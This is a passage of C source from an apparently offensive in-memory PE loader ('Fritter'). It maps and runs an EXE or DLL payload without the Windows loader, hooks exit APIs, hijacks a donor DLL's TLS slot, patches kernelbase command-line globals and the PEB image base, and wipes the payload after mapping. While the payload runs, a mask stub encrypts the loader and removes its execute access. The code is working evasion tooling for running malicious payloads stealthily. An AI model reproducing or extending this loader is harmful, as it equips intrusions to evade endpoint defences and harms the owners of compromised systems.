        rf[0] = cur + 20;
        rf[1] = cur + 20 + n_gp;
        rf[2] = cur;
        pe->fn_table2 = (PBYTE)cs + cur + 8;

        s += 20;
        Memcpy(s, inst->gp_stub, n_gp);
        *(PULONG64)(s + inst->gp_real)    = (ULONG64)pe->gpa_real;
        *(PULONG64)(s + inst->gp_from[0]) = (ULONG64)(ULONG_PTR)inst->api.ExitProcess;
        *(PULONG64)(s + inst->gp_to[0])   = (ULONG64)pe->exit_fn;
        *(PULONG64)(s + inst->gp_from[1]) = (ULONG64)(ULONG_PTR)inst->api.RtlExitUserProcess;
        *(PULONG64)(s + inst->gp_to[1])   = (ULONG64)pe->exit_fn;
        // the third pair is completed below, once the other stub has its place
        *(PULONG64)(s + inst->gp_from[2]) = (ULONG64)(ULONG_PTR)inst->api.TerminateProcess;
        *(PULONG64)(s + inst->gp_to[2])   = (ULONG64)(ULONG_PTR)inst->api.TerminateProcess;

        *(PULONG_PTR)((PBYTE)wv + pe->gpa_slot) = (ULONG_PTR)cs + cur + 20;
        pe->hooked = TRUE;
        cur += 20 + n_gp;
      }
    }
    if (pe->fn_table2 != NULL && tp_rva != 0) {
      rf = (PDWORD)((PBYTE)wv + ((PBYTE)pe->fn_table2 - (PBYTE)cs));
      s  = (PBYTE)wv + rf[0];
      *(PULONG64)(s + inst->gp_to[2]) = (ULONG64)(ULONG_PTR)cs + tp_rva;
    }

    if (split) {
      // done writing: replace the placeholder with the final views
      inst->api.NtUnmapViewOfSection(proc, wv);

      for (i=0; i<=cnt; i++) {                                   // headers, then each section
        rva  = (i == 0) ? 0 : shcp[i-1].VirtualAddress;
        size = (i < cnt) ? shcp[i].VirtualAddress : (DWORD)viewSize;
        if (size <= rva) continue;

        // Later changes cannot exceed what a view was mapped with, so data
        // is mapped read/write and tightened below.
        newprot = PAGE_READWRITE;
        if (i != 0 && (shcp[i-1].Characteristics & IMAGE_SCN_MEM_EXECUTE))
          newprot = (shcp[i-1].Characteristics & IMAGE_SCN_MEM_WRITE) ?
                    PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;

        // carve the range out of the placeholder (nothing to carve for the last one)
        inst->api.VirtualFree((PBYTE)cs + rva, size - rva, MEM_RELEASE | 0x00000002 /* keep placeholder */);
        if (inst->api.MapViewOfFile3(pe->hSection, proc, (PBYTE)cs + rva, rva,
              size - rva, 0x00004000 /* replace placeholder */, newprot, NULL, 0) == NULL) {
          DPRINT("MapViewOfFile3 failed: %d", inst->api.GetLastError());
          return FALSE;
        }
      }
    } else {
      // Start everything out read-only: sections are padded, and padding
      // that is not covered below would otherwise stay as it was mapped.
      inst->api.VirtualProtect(cs, viewSize, PAGE_READONLY, &oldprot);
    }

    DPRINT("Setting permissions for each PE section");
    for (i = 0; i < cnt; i++) {
      BOOL isRead    = (shcp[i].Characteristics & IMAGE_SCN_MEM_READ)    ? TRUE : FALSE;
      BOOL isWrite   = (shcp[i].Characteristics & IMAGE_SCN_MEM_WRITE)   ? TRUE : FALSE;
      BOOL isExecute = (shcp[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? TRUE : FALSE;

      if (isExecute) {
        if (isWrite)
          newprot = PAGE_EXECUTE_READWRITE;
        else
          newprot = isRead ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
      } else {
        newprot = isWrite ? PAGE_READWRITE : PAGE_READONLY;
      }

      if (i < (cnt - 1))
        numBytes = shcp[i+1].VirtualAddress - shcp[i].VirtualAddress;
      else
        numBytes = (shcp[i].Misc.VirtualSize > shcp[i].SizeOfRawData) ?
                    shcp[i].Misc.VirtualSize : shcp[i].SizeOfRawData;

      if (numBytes == 0) continue;

      oldprot = 0;
      DPRINT("Section %s: 0x%X, 0x%llX bytes, protection 0x%X", shcp[i].Name, shcp[i].VirtualAddress, numBytes, newprot);

      if (!(inst->api.VirtualProtect((PBYTE)cs + shcp[i].VirtualAddress, numBytes, newprot, &oldprot)))
        DPRINT("VirtualProtect failed: %d", inst->api.GetLastError());
    }

    // the headers
    oldprot = 0;
    inst->api.VirtualProtect(cs, split ? shcp[0].VirtualAddress : pe->ntc.OptionalHeader.BaseOfCode, PAGE_READONLY, &oldprot);

    // Register the image's unwind data. The view is not known to the OS
    // loader, so without this no exception raised inside the payload
    // (SEH or C++) can be dispatched or unwound.
    rva  = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    size = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    if (rva != 0 && size >= sizeof(RUNTIME_FUNCTION) &&
        rva < size_of_img && size <= size_of_img - rva) {
      pe->fn_table = RVA2VA(PVOID, cs, rva);
      if (!inst->api.RtlAddFunctionTable(pe->fn_table, size / sizeof(RUNTIME_FUNCTION), (DWORD64)cs)) {
        DPRINT("RtlAddFunctionTable failed");
        pe->fn_table = NULL;
      }
    }
    if (pe->fn_table2 != NULL &&
        !inst->api.RtlAddFunctionTable(pe->fn_table2, 1, (DWORD64)cs)) pe->fn_table2 = NULL;

    return TRUE;
}

// Address of an export of the image, by name.
static PVOID PeExport(PPE_IMAGE pe, PCHAR method) {
    PIMAGE_EXPORT_DIRECTORY exp;
    PDWORD                  adr, sym;
    PWORD                   ord;
    DWORD                   rva, cnt;

    rva = pe->ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (rva == 0) return NULL;

    exp = RVA2VA(PIMAGE_EXPORT_DIRECTORY, pe->cs, rva);
    adr = RVA2VA(PDWORD, pe->cs, exp->AddressOfFunctions);
    sym = RVA2VA(PDWORD, pe->cs, exp->AddressOfNames);
    ord = RVA2VA(PWORD,  pe->cs, exp->AddressOfNameOrdinals);

    for (cnt = exp->NumberOfNames; cnt != 0; cnt--) {
      if (!_strcmp(RVA2VA(PCHAR, pe->cs, sym[cnt-1]), method))
        return RVA2VA(PVOID, pe->cs, adr[ord[cnt-1]]);
    }
    return NULL;
}

// In-memory execution of an unmanaged EXE or DLL. The image is prepared by
// the three stages above; this function stays readable in memory while the
// payload runs, so it only holds what has to happen around the payload.
VOID RunPE(PFRITTER_INSTANCE inst, PFRITTER_MODULE mod) {
    PE_IMAGE                    pe;
    PIMAGE_TLS_DIRECTORY        tls;
    PIMAGE_TLS_CALLBACK         *callbacks;
    Start_t                     Start = NULL;       // EXE
    DllMain_t                   DllMain;            // DLL
    DllParam_t                  DllParam;           // DLL function accepting one string parameter
    DllVoid_t                   DllVoid;            // DLL function that accepts no parameters
    PVOID                       cs;
    PBYTE                       ofs;
    DWORD                       i, rva;
    HANDLE                      hThread;
    WCHAR                       buf[FRITTER_MAX_NAME+1];
    BOOL                        started = FALSE;
    BOOL                        parked = FALSE;
    PPEB                        peb;
    PVOID                       host_base = NULL;
    BOOL                        base_swapped = FALSE;
    PULONG64                    hb = NULL;           // exit hook block, when armed
    PULONG64                    ms = MaskBase(inst); // mask stub page, if any
    PCONTEXT                    ctx;
    PDWORD                      again;
    BYTE                        ctxbuf[sizeof(CONTEXT) + 32];

    Memset(&pe, 0, sizeof(pe));

    if (!PeMap(inst, mod, &pe) || !PeImports(inst, mod, &pe) || !PeViews(inst, mod, &pe))
      goto pe_cleanup;

    cs = pe.cs;

    // The image is complete; the file it was built from is not needed again.
    Memset(mod->data, 0, mod->len);

    if (pe.ntc.OptionalHeader.AddressOfEntryPoint != 0)
      Start = RVA2VA(Start_t, cs, pe.ntc.OptionalHeader.AddressOfEntryPoint);

    // Everything that still needs a protected loader function happens here,
    // before the payload gets control.
    if(mod->type == FRITTER_MODULE_DLL) {
      if(mod->args[0] != 0 && mod->unicode) {
        ansi2unicode(inst, mod->args, buf);
      }
    } else {
      if(Start == NULL) {
        DPRINT("EXE has no entry point");
        goto pe_cleanup;
      }

      // optional: make the EXE the process image for its lifetime, so
      // GetModuleHandle(NULL) and resource lookups find it
      if(mod->imgbase != 0) {
        peb       = GET_PEB();
        host_base = peb->ImageBaseAddress;
        peb->ImageBaseAddress = cs;
        base_swapped = TRUE;
      }

      // set the command line
      if(mod->args[0] != 0) {
        ansi2unicode(inst, mod->args, buf);
        DPRINT("Setting command line: %ws", buf);
        SetCommandLineW(inst, buf);
      }
    }

    // Static thread-local storage: Windows only gives a slot to images it
    // loaded itself, so borrow the slot of a DLL it did load.
    rva = pe.ntc.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if(rva != 0 && inst->tls_donor[0] != 0) {
      if(!DonorTls(inst, RVA2VA(PIMAGE_TLS_DIRECTORY, cs, rva))) {
        DPRINT("No static TLS slot for the payload");
        goto pe_cleanup;
      }
    }

    if(pe.hooked && mod->thread == 0 && inst->hook != 0) {
      hb    = (PULONG64)(ULONG_PTR)inst->hook;
      ctx   = (PCONTEXT)(((ULONG_PTR)ctxbuf + 15) & ~(ULONG_PTR)15);
      // kept in memory the capture call could have written, so the
      // compiler cannot assume its value after the second return
      again  = (PDWORD)((PBYTE)ctx + sizeof(CONTEXT));
      *again = 0;
      hb[1] = (ULONG_PTR)ctx;
      hb[2] = (ULONG_PTR)inst->api.RtlRestoreContext;
      hb[3] = (ULONG_PTR)inst->api.RtlExitUserThread;
      hb[4] = (ULONG_PTR)((PVOID*)NtCurrentTeb())[9];   // this thread's id
      if(ms != NULL) ms[FRITTER_MASK_TID] = hb[4];
    }

    // The loader has nothing left to do until the payload returns. Every
    // call into the payload goes through the mask stub, which encrypts the
    // loader and takes execute access from it for the duration. Without a
    // stub the loader is parked: readable, but no page writable and
    // executable.
    if(ms == NULL) {
      ParkLoader(inst, PARK_CODE);
      parked = TRUE;
    }

    if(hb != NULL) {
      // an exit API called by the payload resumes here a second time
      ctx->ContextFlags = CONTEXT_FULL;
      inst->api.RtlCaptureContext(ctx);
      if(*again) {
        // The runtime's exit handlers never ran and may still be
        // registered with the host: leave the image mapped, as in
        // thread mode.
        started = TRUE;
        goto pe_exited;
      }
      *again = 1;
    }

    // TLS callbacks. These are only called here, not when a thread begins
    // or ends or when the process ends.
    if(rva != 0) {
      tls = RVA2VA(PIMAGE_TLS_DIRECTORY, cs, rva);

      // address of callbacks is absolute. requires relocation information
      callbacks = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
      DPRINT("AddressOfCallBacks : %p", callbacks);

      if(callbacks) {
        while(*callbacks != NULL) {
          DPRINT("Calling %p", *callbacks);
          ((PIMAGE_TLS_CALLBACK)MaskCall(inst, (PVOID)*callbacks))((LPVOID)cs, DLL_PROCESS_ATTACH, NULL);
          callbacks++;
        }
      }
    }

    if(mod->type == FRITTER_MODULE_DLL) {
      // a DLL may have no entry point at all
      if(Start != NULL) {
        DllMain = (DllMain_t)MaskCall(inst, (PVOID)Start);
        DPRINT("Executing entrypoint of DLL: %p", (PVOID)DllMain);
        DllMain(cs, DLL_PROCESS_ATTACH, NULL);
      }

      // call exported api?
      if(mod->method[0] != 0) {
        DllParam = (DllParam_t)PeExport(&pe, mod->method);

        if(DllParam == NULL) {
          DPRINT("Unable to resolve API");
          goto pe_cleanup;
        }
        DPRINT("Invoking %s", mod->method);
        // pass parameters/command line to function?
        if(mod->args[0] != 0) {
          DllParam = (DllParam_t)MaskCall(inst, (PVOID)DllParam);
          DllParam((mod->unicode) ? (PVOID)buf : (PVOID)mod->args);
        } else {
          // execute DLL function with no parameters
          DllVoid = (DllVoid_t)MaskCall(inst, (PVOID)DllParam);
          DllVoid();
        }
      }
    } else {
      if(mod->thread != 0) {
        // The exit APIs were replaced with RtlExitUserThread, so an exit
        // ends this thread and the wait below returns.
        DPRINT("Creating thread for entrypoint of EXE : %p\n\n", (PVOID)Start);
        hThread = inst->api.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Start, NULL, 0, NULL);

        if(hThread != NULL) {
          started = TRUE;
          // wait for thread to terminate
          ((DWORD (WINAPI *)(HANDLE, DWORD))MaskCall(inst, (PVOID)inst->api.WaitForSingleObject))(hThread, INFINITE);
          DPRINT("Process terminated");
        }
      } else {
        DPRINT("Executing entrypoint: %p\n\n", (PVOID)Start);
        ((Start_t)MaskCall(inst, (PVOID)Start))(GET_PEB());
      }
    }

pe_exited:
    // if user specified to block instead of exit, then block infinitely before cleanup
    if (inst->exit_opt == FRITTER_OPT_EXIT_BLOCK) {
      DPRINT("Execution complete. Blocking indefintely.");

      ((VOID (WINAPI *)(DWORD))MaskCall(inst, (PVOID)inst->api.Sleep))(INFINITE);
    }

pe_cleanup:
    if(parked) ParkLoader(inst, PARK_OFF);
    if(hb != NULL) hb[1] = 0;
    if(ms != NULL) ms[FRITTER_MASK_TID] = 0;

    if(base_swapped) {
      peb = GET_PEB();
      peb->ImageBaseAddress = host_base;
    }
    DPRINT("Releasing memory");

    // Once an EXE has started, its runtime's callbacks and any thread it
    // left behind still point into the image: it stays mapped.
    if(pe.cs != NULL && !started) {
      if(pe.fn_table  != NULL) inst->api.RtlDeleteFunctionTable(pe.fn_table);
      if(pe.fn_table2 != NULL) inst->api.RtlDeleteFunctionTable(pe.fn_table2);
      if(pe.split && pe.shcp != NULL) {
        // one view per range; a range that never got its view is still a placeholder
        for(i=0; i<=pe.ntc.FileHeader.NumberOfSections; i++) {
          ofs = (PBYTE)pe.cs + ((i == 0) ? 0 : pe.shcp[i-1].VirtualAddress);
          if(inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), ofs) != 0)
            inst->api.VirtualFree(ofs, 0, MEM_RELEASE);
        }
      } else {
        inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), pe.cs);
      }
    }
    // the views keep the section alive; the handle is not needed for that
    if(pe.hSection != NULL) inst->api.CloseHandle(pe.hSection);

    // MEM_RELEASE requires size 0 and no other flags
    if (pe.shcp != NULL)
      inst->api.VirtualFree(pe.shcp, 0, MEM_RELEASE);

    if (pe.origmod != NULL)
      inst->api.VirtualFree(pe.origmod, 0, MEM_RELEASE);

    DPRINT("Wiping payload from Fritter module in memory.");
    Memset(mod->data, 0, mod->len);
}

// Give the payload the static TLS slot of the donor DLL. Windows keeps
// allocating, filling and freeing the per-thread blocks as it does for
// any DLL; only the template they are filled from is replaced with the
// payload's. The donor must not be in use, must have no TLS callbacks
// and its template must be at least as large as the payload's.
BOOL DonorTls(PFRITTER_INSTANCE inst, PIMAGE_TLS_DIRECTORY tls) {
    PIMAGE_DOS_HEADER    dos;
    PIMAGE_NT_HEADERS    nt;
    PIMAGE_TLS_DIRECTORY dt;
    PVOID                d;
    PBYTE                tpl, blk, *vec;
    SIZE_T               raw, cap;
    DWORD                rva, idx, old;

    if(tls->AddressOfIndex == 0 ||
       tls->EndAddressOfRawData < tls->StartAddressOfRawData) return FALSE;
    raw = (SIZE_T)(tls->EndAddressOfRawData - tls->StartAddressOfRawData);

    // a donor that is already loaded is being used by someone
    if(inst->api.GetModuleHandleA(inst->tls_donor) != NULL) return FALSE;

    d = xGetLibAddress(inst, inst->tls_donor);
    if(d == NULL) return FALSE;

    dos = (PIMAGE_DOS_HEADER)d;
    nt  = RVA2VA(PIMAGE_NT_HEADERS, d, dos->e_lfanew);
    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    if(rva == 0) return FALSE;

    dt = RVA2VA(PIMAGE_TLS_DIRECTORY, d, rva);
    if(dt->AddressOfIndex == 0 || dt->EndAddressOfRawData <= dt->StartAddressOfRawData) return FALSE;
    // its callbacks would read the payload's data as their own
    if(dt->AddressOfCallBacks != 0 && *(PULONG_PTR)dt->AddressOfCallBacks != 0) return FALSE;

    cap = (SIZE_T)(dt->EndAddressOfRawData - dt->StartAddressOfRawData);
    if(cap < raw || cap - raw < tls->SizeOfZeroFill) return FALSE;

    idx = *(PDWORD)dt->AddressOfIndex;
    tpl = (PBYTE)dt->StartAddressOfRawData;

    // threads created from now on start with the payload's template
    if(!inst->api.VirtualProtect(tpl, cap, PAGE_READWRITE, &old)) return FALSE;
    Memset(tpl, 0, (DWORD)cap);
    Memcpy(tpl, (PVOID)tls->StartAddressOfRawData, (DWORD)raw);
    inst->api.VirtualProtect(tpl, cap, old, &old);

    // this thread was given the donor's data when the donor was loaded
    vec = (PBYTE*)((PVOID*)NtCurrentTeb())[11];   // ThreadLocalStoragePointer
    blk = (vec != NULL) ? vec[idx] : NULL;
    if(blk == NULL) return FALSE;
    Memcpy(blk, tpl, (DWORD)cap);

    *(PDWORD)tls->AddressOfIndex = idx;
    return TRUE;
}

// check each exit-related api with name provided
// return TRUE if found, else FALSE
BOOL IsExitAPI(PFRITTER_INSTANCE inst, PCHAR name) {
    PCHAR str;
    CHAR  api[128];
    INT   i;
    
    str = inst->exit_api;
    
    for(;;) {
      // store string until null byte or semi-colon encountered
      for(i=0; str[i] != '\0' && str[i] !=';' && i<127; i++) api[i] = str[i];
      // nothing stored? end
      if(i == 0) break;
      // skip name plus one for separator
      str += (i + 1);
      // store null terminator
      api[i] = '\0';
      // if equal, return TRUE
      if(!_strcmp(api, name)) return TRUE;
    } 
    return FALSE;
}

// returns TRUE if ptr is heap memory
BOOL IsHeapPtr(PFRITTER_INSTANCE inst, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = inst->api.VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_PRIVATE   ) && 
            (mbi.Protect == PAGE_READWRITE));
}

BOOL CheckForILOnly(PIMAGE_NT_HEADERS nthost, ULONG_PTR host)
{
	PIMAGE_DATA_DIRECTORY		net_data_dir;
	PBYTE						cor20_hdr;
	DWORD						cor20_flags;

	net_data_dir = &nthost->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR];

	if (net_data_dir->Size && net_data_dir->VirtualAddress) {

		cor20_hdr = (PBYTE)(host + net_data_dir->VirtualAddress);
		cor20_flags = *(PDWORD)((ULONG_PTR)cor20_hdr + 0x10);

		if (cor20_flags & 0x1 /* IL_ONLY */) {
			if ((cor20_flags & 0x2) /* ! 32_BIT_REQUIRED */ == 0) {
				return TRUE;
			}
		}
	}

	return FALSE;
}

// Set the command line for host process.
//
// This replaces kernelbase!BaseUnicodeCommandLine and kernelbase!BaseAnsiCommandLine
// that kernelbase!KernelBaseDllInitialize reads from NtCurrentPeb()->ProcessParameters->CommandLine 
//
// BOOL KernelBaseDllInitialize(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
//
// Only tested on windows 10, but should work with at least windows 7
BOOL SetCommandLineW(PFRITTER_INSTANCE inst, PCWSTR CommandLine) {
    PIMAGE_DOS_HEADER            dos;
    PIMAGE_NT_HEADERS            nt;
    PIMAGE_SECTION_HEADER        sh;
    DWORD                        i, cnt = 0;
    PULONG_PTR                   ds = NULL;
    HMODULE                      m;
    ANSI_STRING                  ansi;
    PANSI_STRING                 mbs;
    PUNICODE_STRING              wcs;
    PPEB                         peb;
    PPEB_LDR_DATA                ldr;
    PLDR_DATA_TABLE_ENTRY        dte;
    PRTL_USER_PROCESS_PARAMETERS upp;
    BOOL                         bSet = FALSE;
    CHAR                         **argv;
    WCHAR                        **wargv;
    p_acmdln_t                   p_acmdln;
    p_wcmdln_t                   p_wcmdln;
    CHAR                         sym[128];
    PCHAR                        str;
    INT                          fptr, atype;
    PVOID                        addr, wcmd, acmd;
    
    peb = GET_PEB();
    upp = peb->ProcessParameters;

    Memset(&ansi, 0, sizeof(ansi));

    DPRINT("Obtaining handle for %s", inst->kernelbase);
    if(inst->api.GetModuleHandle(inst->kernelbase) == NULL) return FALSE;
    m   = inst->api.GetModuleHandle(inst->kernelbase);
    dos = (PIMAGE_DOS_HEADER)m;  
    nt  = RVA2VA(PIMAGE_NT_HEADERS, m, dos->e_lfanew);  
    sh  = (PIMAGE_SECTION_HEADER)((LPBYTE)&nt->OptionalHeader + 
          nt->FileHeader.SizeOfOptionalHeader);
          
    // locate the .data segment, save VA and number of pointers
    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
      if(*(PDWORD)sh[i].Name == *(PDWORD)inst->dataname) {
        ds  = RVA2VA(PULONG_PTR, m, sh[i].VirtualAddress);
        cnt = sh[i].Misc.VirtualSize / sizeof(ULONG_PTR);
        break;
      }
    }
    
    DPRINT("Searching %i pointers", cnt);
    
    wcmd = inst->api.GetCommandLineW();
    
    for(i=0; i<cnt; i++) {
      wcs = (PUNICODE_STRING)&ds[i];
      // skip if not equal
      if(wcs->Buffer != wcmd) continue;
      DPRINT("BaseUnicodeCommandLine found at %p:%p : %ws", &ds[i], wcs->Buffer, wcs->Buffer);
      // overwrite buffer for GetCommandLineW
      inst->api.RtlCreateUnicodeString(wcs, CommandLine);
      DPRINT("GetCommandLineW() : %ws", GetCommandLineW());
      break;
    }
    // not found: nothing to convert or patch in below
    if(i == cnt) return FALSE;
    
    acmd = inst->api.GetCommandLineA();
    
    for(i=0; i<cnt; i++) {
      mbs = (PANSI_STRING)&ds[i];
      // skip if not equal
      if(mbs->Buffer != acmd) continue;
      DPRINT("BaseAnsiCommandLine found at %p:%p : %s", &ds[i], mbs->Buffer, mbs->Buffer);
      inst->api.RtlUnicodeStringToAnsiString(&ansi, wcs, TRUE);
      Memcpy(&ds[i], &ansi, sizeof(ANSI_STRING));
      DPRINT("GetCommandLineA() : %s", GetCommandLineA());
      break;
    }
    
    ldr = (PPEB_LDR_DATA)peb->Ldr;

    // for each DLL loaded
    for (dte = PEB_ENTRY_TO_DTE(PEB_MODULE_LIST(ldr).Flink);
         dte->DllBase != NULL;
         dte = PEB_NEXT_DTE(dte))
    {
      // check for exported symbols and patch according to string type
      str = (PCHAR)inst->cmd_syms;
      
      for(;;) {
        // reset flags
        atype = 1; fptr = 0;
        // store string until null byte or semi-colon encountered
        for(i=0; str[i] != '\0' && str[i] !=';' && i<127; i++) {
          // w indicates unicode type
          if(str[i] == 'w') atype = 0;
          // p indicates function pointer
          if(str[i] == 'p') fptr  = 1;
          // store byte
          sym[i] = str[i];
        }
        // nothing stored? end loop for this DLL
        if(i == 0) break;
        // skip name plus one for separator
        str += (i + 1);
        // store null terminator
        sym[i] = '\0';
        // see if it can be resolved for current module
        addr = xGetProcAddress(inst, dte->DllBase, sym, 0);
        // nothing resolve? get the next symbol from list
        if(addr == NULL) continue;
        // is this ansi?
        if(atype) {
          argv = (PCHAR*)addr;
          // pointer?
          if(fptr != 0) {
            p_acmdln = (p_acmdln_t)addr;
            argv = p_acmdln();
          }
          // anything to patch?
          DPRINT("Checking %s", sym);
          if(argv != NULL && ansi.Buffer != NULL && IsHeapPtr(inst, *argv)) {
            DPRINT("Setting %ws!%s \"%s\" to \"%s\"", 
              dte->BaseDllName.Buffer, sym, *argv, ansi.Buffer);
            *argv = ansi.Buffer;
          }
        } else {
          wargv = (PWCHAR*)addr;
          // pointer?
          if(fptr != 0) {
            p_wcmdln = (p_wcmdln_t)addr;
            wargv = p_wcmdln();
          }
          // anything to patch?
          DPRINT("Checking %s", sym);
          if(wargv != NULL && IsHeapPtr(inst, *wargv)) {
            DPRINT("Setting %ws!%s \"%ws\" to \"%ws\"", 
              dte->BaseDllName.Buffer, sym, *wargv, wcs->Buffer);
            *wargv = wcs->Buffer;
          }
        }
      }
    }
    return TRUE;
}
